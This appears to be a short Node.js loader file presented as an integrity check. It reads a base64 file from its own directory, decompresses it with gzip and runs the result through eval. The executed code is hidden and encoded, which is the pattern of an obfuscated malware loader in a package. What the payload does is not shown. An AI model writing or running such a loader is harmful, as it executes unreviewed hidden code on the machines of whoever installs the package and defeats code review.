'use strict';
const fs=require('fs'),path=require('path'),zlib=require('zlib');
const payload=fs.readFileSync(path.join(__dirname,'alpha115-integrity-payload.b64'),'utf8').trim();
eval(zlib.gunzipSync(Buffer.from(payload,'base64')).toString('utf8'));
